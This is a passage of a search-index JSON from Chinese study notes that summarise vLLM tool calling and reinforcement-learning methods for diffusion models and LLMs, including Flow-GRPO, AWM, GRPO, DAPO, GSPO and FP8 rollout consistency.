/path/to/my_template.jinja\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_9","title":"\u603b\u7ed3","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_10","title":"\u5173\u952e\u8981\u70b9","text":"<ol> <li>\u2705 vLLM \u901a\u8fc7\u81ea\u5b9a\u4e49 chat template \u6ce8\u5165\u5de5\u5177\u63cf\u8ff0\uff0c\u800c\u4e0d\u662f\u4f9d\u8d56\u6a21\u578b\u539f\u751f tokenizer \u7684\u6a21\u677f</li> <li>\u2705 \u4e0d\u540c\u6a21\u578b\u4f7f\u7528\u4e0d\u540c\u7684\u8f93\u51fa\u683c\u5f0f\uff1a</li> <li>DeepSeek\uff1aSpecial Tokens\uff08<code>&lt;\uff5ctool\u2581call\u2581begin\uff5c&gt;...</code>\uff09</li> <li>Llama\uff1aPure JSON\uff08<code>{\"name\": \"...\", \"parameters\": {...}}</code>\uff09</li> <li>\u2705 ToolParser \u8d1f\u8d23\u89e3\u6790\u6a21\u578b\u8f93\u51fa\uff0c\u63d0\u53d6\u7ed3\u6784\u5316\u7684\u5de5\u5177\u8c03\u7528\u4fe1\u606f</li> <li>\u2705 \u5b8c\u5168\u517c\u5bb9 OpenAI API\uff0c\u5ba2\u6237\u7aef\u65e0\u9700\u611f\u77e5\u5e95\u5c42\u5b9e\u73b0\u5dee\u5f02</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_11","title":"\u6838\u5fc3\u6d41\u7a0b\u56de\u987e","text":"<pre><code>\u7528\u6237 tools \u2192 Chat Template \u6ce8\u5165 \u2192 \u6a21\u578b\u8f93\u51fa \u2192 ToolParser \u89e3\u6790 \u2192 OpenAI \u683c\u5f0f\u8fd4\u56de\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/vLLM%20Tool%20Calling%20%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3/#_12","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>vLLM \u5b98\u65b9\u6587\u6863\uff1ahttps://docs.vllm.ai/en/stable/features/tool_calling.html</li> <li>\u6e90\u7801\u4ed3\u5e93\uff1ahttps://github.com/vllm-project/vllm</li> <li>DeepSeek V3.1 Template\uff1a<code>examples/tool_chat_template_deepseekv31.jinja</code></li> <li>Llama 3.1 Template\uff1a<code>examples/tool_chat_template_llama3.1_json.jinja</code></li> <li>ToolParser \u5b9e\u73b0\uff1a<code>vllm/entrypoints/openai/tool_parsers/</code></li> </ul> <p>\u6587\u6863\u751f\u6210\u65f6\u95f4: 2025-01-21 vLLM \u7248\u672c: Based on latest main branch \u4f5c\u8005: Claude Code Analysis</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/Diffusion%20RL%20Theory/","title":"Diffusion RL Theory","text":"<ul> <li>AWM \u5b98\u65b9\u535a\u5ba2</li> <li>Diffusion RL summary</li> <li>flow-grpo</li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/Diffusion%20RL%20Theory/#1-flow-grpo","title":"1. Flow-GRPO","text":"<p>\u8fd9\u662f\u4eceDS-R1\u4e4b\u540e\uff0c\u5f71\u54cd\u529b\u8f83\u5927\u7684\u7b2c\u4e00\u7bc7\u5c06GRPO\u8fc1\u79fb\u5230flow matching\u4e0a\u7684\u5de5\u4f5c\uff0c\u540c\u671f\u6709\u5f88\u591a\u7c7b\u4f3c\u7684\u5de5\u4f5c\uff0c\u6bd4\u5982DanceGRPO</p> <p>\u8981\u5c06llm\u7684rl\u8303\u5f0f\u8fc1\u79fb\u5230flow matching\uff0c\u9762\u5bf9\u7684\u6700\u5927\u95ee\u9898\u5c31\u662fflow matching\u7684ode\u8f68\u8ff9\u662f\u786e\u5b9a\u7684\u3002\u6211\u4eec\u77e5\u9053GRPO\u5b9e\u9645\u662f\u5728\u4f18\u5316\u91cd\u8981\u6027\u91c7\u6837\u7684\u90a3\u4e2a\u6bd4\u4f8b\uff0c\u4f46\u662fLLM\u7684\u8f93\u51fa\u662f\u6574\u4e2atoken\u7a7a\u95f4\uff0c\u800cflow\u7684ode\u8f93\u51fa\u7684\u662f\u5177\u4f53\u7684\u901f\u5ea6\uff0c\u4e5f\u5bfc\u81f4\u4e86\u5176\u65e0\u6cd5\u83b7\u5f97\u91cd\u8981\u6027\u91c7\u6837\u7684\u6982\u7387\u6bd4\uff0c\u4e5f\u5c31\u662f\u65e0\u6cd5\u4f18\u5316\uff0c\u8fd9\u4e2a\u662f\u9996\u8981\u9700\u8981\u89e3\u51b3\u7684\u95ee\u9898</p> <p>\u91cd\u8981\u6027\u91c7\u6837\u4e3a</p> \\[r^i(\\theta)=\\frac{p_\\theta(x_{t-1}^{i}|x_{t-1}^i,c)}{{p_\\theta}_{old}(x_{t-1}^{i}|x_{t-1}^i,c)}\\] <p>\u95ee\u9898\u5c31\u5728\u4e8e\uff0cflow\u6a21\u578bode\u662f\u4e00\u4e2a\u72c4\u62c9\u514b\u5206\u5e03: \\(p_\\theta(x_{s}|x_{t},c),s&lt;t\\) \uff0c\u56e0\u6b64\u8981\u5f15\u5165\u6982\u7387\u5206\u5e03\uff0c\u5c31\u5728\u7279\u5b9a\u7684\u4e00\u6b65\uff0c\u5c06ode\u8f6c\u6362\u6210sde\uff0c\u5177\u4f53\u7684\u65b9\u6848\u5982\u4e0b</p> <p></p> <p>Flow GRPO\u5b9e\u9645\u7684policy gradient\u5b9e\u9645\u4e0a\u662f\u4f7f\u7528advantage\u52a0\u6743\u7684\u566a\u58f0\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u68af\u5ea6\u7684\u63a8\u5bfc\u53d1\u73b0\u8fd9\u4e00\u70b9\uff0c\u8fd9\u4e2a\u63a8\u5bfc\u5728Diffusion NFT\u7684\u8bba\u6587\u4e2d\u4e5f\u6709\u8fc7\u7a0b</p> \\[\\begin{aligned} \\nabla_{v_{\\theta}} \\mathcal{L} &amp; \\approx A \\nabla_{v_{\\theta}} \\log p_{\\theta}\\left(\\boldsymbol{x}_{t-1}^i \\mid \\boldsymbol{x}_t^i\\right) \\\\ &amp; =-A \\frac{2\\left(C_1\\left(\\boldsymbol{v}_{o l d}-\\boldsymbol{v}_{\\theta}\\right)+C_2 \\boldsymbol{\\epsilon}\\right) C_1}{2 C_2^2} \\\\ &amp; \\approx-\\frac{C_1}{C_2} A \\boldsymbol{\\epsilon} \\end{aligned}\\] <p>\u66f4\u901a\u4fd7\u7684\u6765\u8bf4\uff0cFlow GRPO\u7684\u8fc7\u7a0b\u662f\u627e\u5230\u4e86\u4e00\u4e2a\u66f4\u597d\u7684\u566a\u58f0\uff0c\u7136\u540e\u8ba9\u901f\u5ea6\u573a\u5f80\u8fd9\u4e2a\u566a\u58f0\u7684\u65b9\u5411\u8fdb\u884c\u79fb\u52a8\uff0c\u566a\u58f0\u672c\u8eab\u662f\u6ca1\u6709\u610f\u4e49\u7684\uff0c\u53ea\u662f\u8fd9\u4e2a\u566a\u58f0\u9690\u542b\u4e86\u66f4\u4f18\u7684\u901f\u5ea6\u65b9\u5411\uff0c\u56e0\u6b64\u8fd9\u4e2a\u884c\u4e3a\u662f\u6709\u6548\u7684\uff0c\u8fd9\u91cc\u6700\u540e\u4e4b\u6240\u4ee5\u662f\u7ea6\u7b49\u4e8e\uff0c\u662f\u56e0\u4e3a\u5047\u8bbe\u4e86v old \u548c v \u662f\u4e00\u6837\u7684\uff0c\u5b98\u65b9\u5de5\u4f5c\u5728flow grpo guard\u53bb\u6389\u4e86\u8fd9\u4e00\u9879\uff0c\u8fd9\u6837\u5b50\u5c31\u6ca1\u6709\u8fd9\u4e2a\u7ea6\u7b49\u4e8e\uff0c\u5728\u6570\u5b66\u4e0a\u66f4\u4e25\u8c28</p> <p>\u5728Flow GRPO\u540e\u7eed\u51fa\u4e86\u4e00\u4e2a\u7cfb\u5217\u5de5\u4f5c\uff0cFlow GRPO Guard\uff0c\u91cc\u9762\u4e5f\u6709\u8fd9\u4e2a\u68af\u5ea6\u63a8\u5bfc\uff0c\u7ed3\u8bba\u5c31\u662f\uff0cFlow GRPO\u5728\u8ba9\u901f\u5ea6\u573a\u5f80\u4e00\u4e2a\u566a\u58f0\u7684\u65b9\u5411\u79fb\u52a8\uff0c\u8fd9\u4e2a\u5176\u5b9e\u662f\u6709\u70b9\u5947\u602a\u7684\uff0c\u56e0\u6b64LLM\u7684\u9884\u8bad\u7ec3\u548c\u540e\u8bad\u7ec3\u884c\u4e3a\u65f6\u4e00\u81f4\u7684\uff0c\u4f46\u662fFlow GRPO\u4e2d\uff0c\u9884\u8bad\u7ec3\u662f\u4f18\u5316\u901f\u5ea6\u573a\uff0c\u4f46\u662fRL\u5374\u53d8\u6210\u4e86\u4f18\u5316\u566a\u58f0\uff0c\u8fd9\u4e2a\u884c\u4e3a\u4f3c\u4e4e\u662f\u4e0d\u591f\u76f4\u63a5\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/Diffusion%20RL%20Theory/#11-flow-grpo-cps","title":"1.1 Flow GRPO CPS","text":"<ul> <li>https://zhuanlan.zhihu.com/p/1948388095151026330</li> <li>https://arxiv.org/abs/2509.05952</li> </ul> <p>\u8fd9\u662f\u5728\u8fd9\u7bc7\u6587\u7ae0\u91cc\u9762\u63d0\u5230\u7684\uff0c\u5173\u4e8eFlow GRPO\u52a0\u566a\u7684\u4e00\u4e2abug\u7684\u95ee\u9898\uff0c\u5bfc\u81f4\u751f\u6210\u7684\u56fe\u7247\u5e26\u6709\u660e\u663e\u7684\u566a\u58f0\u3002Flow GRPO\u7684\u968f\u673a\u6027\u6ce8\u5165\u5e76\u975e\u662f\u6700\u4f18\u89e3\uff0c\u9996\u5148\u6211\u4eec\u6765\u770bFlowGRPO\u91cc\u7684\u566a\u58f0\u6ce8\u5165\u65b9\u6848</p> <p></p> <p>\u76f8\u6bd4\u4e8eODE\u7684Flow\uff0c\u5176\u589e\u52a0\u4e86\u4e00\u4e2a\u6270\u52a8\u9879\u548c\u4e00\u4e2a\u4fee\u6b63\u9879\uff0c\u7136\u540e\u6211\u4eec\u53ef\u4ee5\u5206\u89e3ODE\u7684Flow\u548cSDE\u7684Flow</p> <p></p> <p>\u4f46\u662f\u5206\u6790\u4e0a\u56fe\u4e2d\u7684Flow-SDE\u7684\u8fc7\u7a0b\uff0c\u6211\u4eec\u53d1\u73b0\uff0cFlow-SDE\u7684\u6bcf\u4e00\u6b65\u7684\u566a\u58f0\u9879\u7684\u7cfb\u6570\uff0c\u6bd4\u7406\u60f3\u7684DDIM\u8fc7\u7a0b\u8981\u9ad8\u5f97\u591a\uff0c\u5c24\u5176\u662f\u5f53t\u5f88\u5c0f\u7684\u65f6\u5019</p> <p></p> <p>\u9488\u5bf9\u8fd9\u4e2a\u95ee\u9898\uff0c\u89e3\u51b3\u65b9\u6848\u4e5f\u5f88\u7b80\u5355\uff0c\u53ea\u8981\u8ba9\u566a\u58f0\u9879\u7684\u7cfb\u6570\u80fd\u591f\u4fdd\u6301\u4e00\u81f4\u5c31\u884c\u4e86\uff0c\u4e5f\u5c31\u662f\u51cf\u53bb\u7684\u5e45\u5ea6\u548c\u65b0\u52a0\u5165\u7684\u5e45\u5ea6\u76f8\u7b26\u5408\uff0c\u4e5f\u5c31\u662f\u8fd9\u7bc7\u8bba\u6587\u7684\u4e3b\u9898 Coefficients-Preserving Sample \u7cfb\u6570\u4fdd\u6301\u91c7\u6837</p> <p>\u6211\u4eec\u8fdb\u4e00\u6b65\u601d\u8003\uff0c\u4e3a\u4ec0\u4e48Flow SDE\u4f1a\u5b58\u5728\u8fd9\u6837\u7684\u95ee\u9898\uff0c\u5b9e\u9645\u662f\u5728Flow GRPO\u5728\u63a8\u5bfc\u7684\u8fc7\u7a0b\u4e2d\uff0c\u76f4\u63a5\u5957\u7528\u4e86Score Match\u90a3\u5957\u7684\u5185\u5bb9\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u5728Score Matching\u4e2d\uff0c\u8fd9\u4e2a\u63a8\u5bfc\u8fc7\u7a0b\u4e0d\u662f\u6052\u7b49\u7684\uff0c\u800c\u662f\u57fa\u4e8e \\(\\Delta t \\rightarrow 0\\) \u8fd9\u4e2a\u5047\u8bbe\uff0c\u8fd9\u4e2a\u5047\u8bbe\u5728\u5f53\u65f6DDPM\u76841000\u6b65\u5de6\u53f3\u7684\u91c7\u6837\u8fc7\u7a0b\u4e2d\uff0c\u786e\u5b9e\u662f\u53ef\u4ee5\u5bb9\u8bb8\u7684\uff0c\u4f46\u662f\u73b0\u5728\u7684\u91c7\u6837\u6a21\u578b\uff0c\u5f80\u5f80\u90fd\u662f\u51e0\u6b65\u5b8c\u6210\u91c7\u6837\uff0c\u8fd9\u4e2a\u63a8\u5bfc\u5c31\u4e0d\u518d\u80fd\u591f\u6210\u7acb  </p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/Diffusion%20RL%20Theory/#22-tempflow-grpo","title":"2.2. TempFlow GRPO","text":"<p>\u5bf9\u4e8eFlow GRPO\u91cc\u7684\u4f18\u5316\u8fdb\u884c\u65f6\u95f4\u52a0\u6743</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/Diffusion%20RL%20Theory/#2-awm","title":"2. AWM","text":"<p>\u8fd9\u7bc7\u8bba\u6587\u6b63\u662f\u53d1\u73b0\u4e86\u4e0a\u8ff0Flow GRPO\u7684\u4e0d\u4e00\u81f4\u95ee\u9898</p> <ul> <li>RL\u4f18\u5316\u7684\u662fReverse\u4e00\u6b65\u8f6c\u6362\u7684\u9ad8\u65af\u5206\u5e03\u7684\u5bf9\u6570\u4f3c\u7136</li> <li>\u9884\u8bad\u7ec3\u4f18\u5316\u7684\u662fscore/flow match loss</li> </ul> <p>\u4ee5Flow GRPO\u4e3a\u4ee3\u8868\u7684\u65b9\u6848\uff0c\u5c06\u5e26\u566a\u6570\u636e\u63a8\u65ad\u8bad\u7ec3\u76ee\u6807\uff0c\u4f1a\u5c06\u8fd9\u4e2a\u4e0d\u786e\u5b9a\u6027\u76f4\u63a5\u4f20\u5230\u68af\u5ea6\u76ee\u6807\u91cc</p> \\[Loss_{AWM}=A^i||v_\\theta(x_t^i)-v_{gt}||\\] <p>\u800cAWM\u63d0\u51fa\u4e86\u4e00\u79cd\u7b56\u7565\u68af\u5ea6\u4e00\u81f4\u7684\u505a\u6cd5\uff0c\u635f\u5931\u51fd\u6570\u4f9d\u7136\u662fFlow matching\u90a3\u4e00\u5957\uff0c\u53ea\u662f\u505a\u4e86\u4e00\u4e2a\u52a0\u6743\uff0c\u7528\u5956\u52b1\u505a\u4e00\u4e2a\u52a0\u6743\uff0c\u5176v gt\u662f\u5c06\u5176\u91c7\u6837\u5230x0\u7684\u65f6\u5019\uff0c\u5c06x0\u518d\u52a0\u4e0a\u4e00\u70b9\u566a\u58f0\u6765\u7684\uff0c\u4f46\u662f\u5982\u4f55\u5224\u65ad\u8fd9\u4e2a\u901f\u5ea6\u503c\u4e0d\u503c\u5f97\u5b66\u4e60\uff0c\u5c31\u662f\u4f9d\u8d56reward\uff0c\u9ad8advantage\u7684\u65f6\u5019\uff0c\u8fd9\u4e2agt\u7684\u901f\u5ea6\u503c\u5f97\u5b66\u4e60\uff0c\u4f46\u662f\u5728\u4f4eadvantage\u7684\u65f6\u5019\uff0c\u8fd9\u4e2agt\u7684\u901f\u5ea6\u5c31\u4f5c\u4e3a\u8d1f\u9762\u6837\u672c</p> <p></p> <p>\u5b9e\u9645\u4f18\u5316\u7684\u65f6\u5019\u8fd8\u8981\u52a0\u4e0aPPO Clip</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/Diffusion%20RL%20Theory/#3-diffusion-nft","title":"3. Diffusion NFT","text":"<p>Diffusion NFT \u5728\u9644\u5f55\u4e2d\u89e3\u91ca\u4e86 Flow GRPO \u5b9e\u9645\u7684\u4f18\u5316\u65b9\u5411\uff0c\u5c31\u662fadvantage-weighted noise\uff0c\u76f8\u6bd4\u4e8eAWM\uff0cNFT\u7684\u505a\u6cd5\u662foff-policy\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/Diffusion%20RL%20Theory/#4-video-rl","title":"4. Video RL","text":"<ul> <li>https://arxiv.org/pdf/2511.21541<ul> <li>\u7528\u4e00\u4e2avideo generation model\u7684\u4e00\u4e9bdit\u5c42\uff0c\u52a0\u4e0a\u4e00\u4e9b\u8bad\u7ec3\u7684\u8f6c\u6362\u5c42\uff0c\u505avideo generation latent reward model</li> <li>\u662fprm\uff0c\u5e76\u4e14\u5728latent\u5c42\u9762\u7ed9\u51fareward\uff0c\u4e0d\u80fd</li> </ul> </li> </ul>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/","title":"LLM RL Theory","text":"<ul> <li>DAPO &amp; GSPO \u5bf9\u4e8e GRPO \u7f3a\u9677\u7684\u4f18\u5316</li> <li>JustRL \u7528\u6700\u7b80\u5355\u7684\u914d\u7f6e\u5b9e\u73b0RL\u7684\u6027\u80fd\u6301\u7eed\u63d0\u5347</li> <li>https://arxiv.org/pdf/2511.19942 Differential Smoothing</li> <li>https://arxiv.org/abs/2505.22617 RL \u4e2d\u7684\u71b5\u673a\u5236</li> <li>https://arxiv.org/pdf/2512.01374 MiniRL\uff1a\u8bad\u63a8\u4e00\u81f4\u6027\u7684RL</li> <li>https://arxiv.org/abs/2512.07783 \u5206\u6790\u9884\u8bad\u7ec3\uff0c\u4e2d\u8bad\u7ec3\uff0cRL\u5bf9\u4e8eLLM\u63a8\u7406\u80fd\u529b\u7684\u5f71\u54cd\uff0c\u6784\u5efa\u4e86\u4e00\u4e2a\u5c3d\u53ef\u80fd\u6d88\u9664\u77e5\u8bc6\u91cd\u53e0\u7684\u8bad\u7ec3\u6570\u636e\u96c6\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u66f4\u597d\u5730\u5206\u6790\u6bcf\u4e2a\u8bad\u7ec3\u9636\u6bb5\u5bf9\u6a21\u578b\u80fd\u529b\u5e26\u6765\u5730\u5f71\u54cd</li> </ul> <p>\u5bf9\u4e8eLLM\u7684RL\uff0c\u7edf\u4e00\u7684\u89c6\u89d2\u5e94\u8be5\u662f\u4f18\u5316\u4e00\u4e2areward\u7684\u671f\u671b\u503c\uff0c\u5e76\u4e14\u9644\u52a0\u4e00\u4e9b\u622a\u65ad\uff0cKL\u7b49\u6280\u5de7</p> <p>RL\u73b0\u9636\u6bb5\u6709\u4e24\u4e2a\u91cd\u8981\u7684\u547d\u9898</p> <ul> <li>\u8bad\u7ec3\u548c\u63a8\u7406\u7684\u4e00\u81f4\u6027\uff1a\u5c24\u5176\u662f\u5bf9\u4e8eMoe\u6a21\u578b\uff0c\u56e0\u4e3a\u73b0\u5728\u66f4\u65b0\u6a21\u578b\u7684\u65f6\u5019\u603b\u662f\u62c6\u5206minibatch\uff0c\u6240\u4ee5\u90fd\u6709\u4e00\u5b9a\u7684off-policy\u3002\u5e76\u4e14\u5f53\u63a8\u7406\u6846\u67b6\u548c\u8bad\u7ec3\u6846\u67b6\u5206\u79bb\uff0c\u4f7f\u7528\u4e0d\u540c\u7684\u7b97\u5b50\u5e93\u7684\u65f6\u5019\uff0c\u5b58\u5728\u7cbe\u5ea6\u7b49\u95ee\u9898\u5bfc\u81f4\u7684\u4e0d\u4e00\u81f4\u6027</li> <li>\u63a2\u7d22\u6027\u548c\u4f18\u5316\u7684\u5e73\u8861\uff1a\u5982\u679c\u7b80\u5355\u5730\u5bf9\u5956\u52b1\u8fdb\u884c\u4f18\u5316\uff0c\u4f1a\u5bfc\u81f4\u5176\u63a2\u7d22\u6027\u5feb\u901f\u4e0b\u964d\uff0c\u6a21\u578b\u9677\u5165\u5c40\u90e8\u6700\u4f18\uff0c\u4e0d\u518d\u63d0\u5347\u6027\u80fd\uff0c\u8868\u73b0\u4e3a\u6a21\u578b\u7684\u71b5\u4e0b\u964d\uff0c\u4ee5\u53ca\u6a21\u578b\u7684Pass@1\u7684\u6027\u80fd\u63d0\u5347\u7684\u540c\u65f6\uff0cPass@k\u7684\u6027\u80fd\u4e0d\u518d\u63d0\u5347</li> </ul> <p>\u5f88\u591a\u7684\u8bba\u6587\u90fd\u56f4\u7ed5\u8fd9\u4e2a\u90e8\u5206\u6765\u5c55\u5f00</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/#1-basic-rl-algorithm","title":"1. Basic RL algorithm","text":"<p>PPO</p> <p></p> <p>importance ratio + Advantage \u4f18\u5316\uff0c\u5f53Advantage  \u5927\u4e8e 0 \u7684\u65f6\u5019\uff0c\u8be5\u4f18\u5316\u76ee\u6807\u4f1a\u8feb\u4f7fimportance ratio\u53d8\u5927</p> <p>PPO\u7684advantage\u8ba1\u7b97\u662f\u901a\u8fc7reward model\u548cvalue model\u5171\u540c\u5b8c\u6210\u7684\uff0cReward model\u8ba1\u7b97\u5373\u65f6\u5956\u52b1\uff0cValue model\u9884\u4f30\u5916\u6765\u7684\u5956\u52b1\uff0c\u968f\u540e\u901a\u8fc7GAE\u6765\u8ba1\u7b97token level advantage</p> <p></p> <p>\u968f\u540e\u4f9d\u6b21\u66f4\u65b0Value model\u548cpolicy model\u7684\u68af\u5ea6</p> <p>GRPO</p> <p></p> <p>GRPO\u901a\u8fc7\u4e00\u4e2agroup\u91cc\u7684\u4f18\u52bf\u8ba1\u7b97\uff0c\u6765\u7ed5\u8fc7value model\u7684\u8bbe\u8ba1\uff0c\u4f7f\u5f97\u8bad\u7ec3\u6210\u672c\u5927\u5e45\u5ea6\u4e0b\u964d\uff0c\u901a\u8fc7\u8ba1\u7b97\u8be5\u6761\u56de\u7b54\u7684reward\u76f8\u6bd4\u4e8e\u8fd9\u4e2agroup\u7684\u5e73\u5747reward\u7684\u4f18\u52bf\uff0c\u6765\u8861\u91cfadvantage</p> <p></p> <p>DAPO</p> <p>DAPO\u7684\u65b9\u6848\u5bf9\u4e8eGRPO\u7684\u8303\u5f0f\u505a\u4e86\u4e00\u7cfb\u5217\u7684\u4f18\u5316\uff0c\u589e\u52a0\u4e86\u5f88\u591aTricks</p> <ul> <li>Clip Higher \u539f\u672c\u7684clip\u7684\u4e0a\u754c\u8fc7\u4f4e\uff0c\u5bfc\u81f4RL\u53ea\u4f1a\u4f18\u5316\u9ad8\u6982\u7387\u9ad8advantage\u7684token\uff0c\u4ee5\u81f3\u4e8e\u5176\u4f1a\u8fc5\u901f\u9677\u5165\u5c40\u90e8\u6700\u4f18\uff0c\u901a\u8fc7\u8c03\u9ad8Clip\u7684\u754c\u9650\uff0c\u53ef\u4ee5\u6709\u6548\u5e2e\u52a9\u4e00\u4e9b\u4f4e\u6982\u7387\u9ad8Advantage\u7684token\u8fdb\u884c\u4f18\u5316\uff0c\u6709\u6548\u63d0\u9ad8\u6a21\u578b\u7684\u4e0a\u9650</li> <li>Dynamic Sampling \u5728\u8bad\u7ec3\u4e2d\u589e\u52a0\u7b5b\u9009\uff0c\u53bb\u6389\u5168\u5bf9\u548c\u5168\u9519\u7684\u6837\u672c</li> <li>Token-level Policy Gradient Loss \u8ba9\u4e00\u4e2amini-batch\u5185\u90e8 repsonse token \u7684advantage\u6743\u91cd\u76f8\u540c</li> <li>Overlong Reward Shaping \u589e\u52a0response length\u7684\u60e9\u7f5a\u9879\u6570</li> </ul> <p>GSPO</p> <p>\u5c06token level\u7684advantage\u548cimportance ratio\u6539\u4e3asequence level\uff0cimportance ratio\u6539\u4e3a</p> <p></p> <p>\u76ee\u6807\u51fd\u6570\u6539\u4e3a</p> <p></p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/#2-training-rollout-consistency","title":"2. Training-Rollout Consistency","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/#21-multi-turn-agent-training","title":"2.1. Multi-Turn Agent Training","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/#22-precision-consistency","title":"2.2. Precision Consistency","text":"<p>Nvidia\u57282\u6708\u4efd\u51fa\u4e86\u4e00\u7bc7\u5173\u4e8e\u8bad\u63a8\u7cbe\u5ea6\u4e00\u81f4\u6027\u7684\u8bba\u6587 Jet RL \uff0c\u5bf9\u4e8eRL\u800c\u8a00\uff0c\u76ee\u524d\u6765\u770b\u6548\u7387\u4e0a\u7684block\u5c31\u5728rollout\u4e0a\u9762\uff0c\u56e0\u6b64\u6700\u76f4\u63a5\u7684\u60f3\u6cd5\u6211\u4eec\u4f1a\u5c06\u76f4\u63a5\u63a8\u7406\u52a0\u901f\u7684\u65b9\u6848\u5e94\u7528\u5728RL\u7684rollout\u4e0a\u9762\uff0c\u6bd4\u5982low-bit\u91cf\u5316\u548c\u7a00\u758f\u8ba1\u7b97\u3002\u8fd9\u7bc7\u8bba\u6587\u5c31\u662f\u7814\u7a76\u4e86FP8 Rollout\u7684\u6280\u672f\uff0c\u4f46\u662f\u5148\u524d\u7684\u4f4e\u7cbe\u5ea6\u7684rollout\u4f1a\u548c\u540e\u7eedBF16\u7684\u8bad\u7ec3\u5f62\u6210\u4e0d\u4e00\u81f4\uff0c\u5f62\u6210Off-Policy\u3002</p> <p>\u8fd9\u7bc7\u8bba\u6587\u5728Verl\u4e0a\u6784\u5efa\u4e00\u4e2aRollout\u548cTrain\u5747\u4e3aFP8\u7684RL\u8fc7\u7a0b</p> <p>\u8fd9\u4e2a\u8fc7\u7a0b\u6709\u5982\u4e0b\u7684\u96be\u70b9</p> <ul> <li>RL\u8fc7\u7a0b\u4e2d\uff0c\u53c2\u6570\u5728\u9891\u7e41\u5730\u66f4\u65b0\uff0c\u4f20\u7edf\u7684FP8\u91cf\u5316\u65b9\u6848\uff0c\u9700\u8981\u6bcf\u6b21\u53c2\u6570\u66f4\u65b0\u4e4b\u540e\u518d\u6b21\u8ba1\u7b97\u7f29\u653e\u7cfb\u6570\uff08\u91cd\u65b0\u6821\u51c6\uff09\uff0c\u9020\u6210\u989d\u5916\u5f00\u9500</li> <li>\u5982\u679c\u4e0d\u8fdb\u884c\u6821\u51c6\uff0c\u76f4\u63a5\u5c06\u53c2\u6570\u622a\u65ad\u4e3aFP8\uff0c\u4f1a\u5bfc\u81f4\u8bad\u7ec3\u7684\u4e0d\u7a33\u5b9a\uff0c\u5c24\u5176\u662f\u9762\u5bf9\u957f\u6587\u672c\u548c\u56f0\u96be\u4efb\u52a1\u4e2d</li> </ul> <p></p> <p>\u53cd\u5411\u4f20\u64ad\u7684\u68af\u5ea6\u4fdd\u6301BF16\uff0c\u5176\u4f59\u5185\u5bb9\u5168\u90e8\u8f6c\u6362\u6210FP8\u3002\u603b\u7ed3\u6765\u770b\u5c31\u662f\u6240\u6709\u7684\u7b97\u5b50\u90fd\u4fdd\u6301FP8\uff0c\u4f46\u662f\u8f93\u51fa\u68af\u5ea6\u7684\u65f6\u5019\u8f6c\u6362\u6210BF16</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/#other-topics","title":"Other Topics","text":"<p>\u8fd9\u91cc\u4ecb\u7ecd\u9664\u4e86\u8bad\u63a8\u4e00\u81f4\u6027\u548c\u63a2\u7d22\u6536\u655b\u4ee5\u5916\u7684\u4e00\u4e9bRL\u4e3b\u9898</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/RL/LLM%20RL%20Theory/#1-bottom-up-policy-optimization","title":"1. Bottom-up Policy 